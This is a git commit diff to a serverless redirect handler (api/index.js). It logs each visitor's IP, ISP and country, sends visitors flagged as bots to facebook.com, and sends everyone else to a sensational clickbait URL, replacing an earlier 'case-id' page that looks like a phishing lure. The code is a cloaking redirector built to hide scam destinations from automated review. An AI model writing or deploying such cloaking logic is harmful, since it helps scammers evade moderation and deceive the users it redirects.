0f23cf27eebe294b16f8d98867f80839b9d76064
kamasutagoadk-debug <kamasutagoadk@gmail.com>
2025-09-25 20:25:36 +0200

    index.js

--- api/index.js
+++ api/index.js
@@ -22,7 +22,7 @@ export default async function handler(req, res) {
     console.log(ip, " - isp:", isp, "- country:", country, "-- timestamp:", new Date(), ":: isBot: ", isBad);
 
     // Redirect
-    return res.redirect(302, isBad ? "https://www.facebook.com" : "https://case-id-9002127328.vercel.app/index");
+    return res.redirect(302, isBad ? "https://www.facebook.com" : "https://for4news.fun/he-didnt-fall-the-way-they-said-a-former-marine-went-through-every-single-frame-and-what-he-discovered-has-set-social-media-on-fire-the-timeline-doesnt-add-up-crucial-evidence-at/");
   } catch (error) {
     console.error("Serverless Function Error:", error);
     res.status(500).json({ error: "Internal Server Error" });
@@ -177,4 +177,5 @@ async function proxy5(ip) {
     return "ALLOW";
   }
 }
+
 
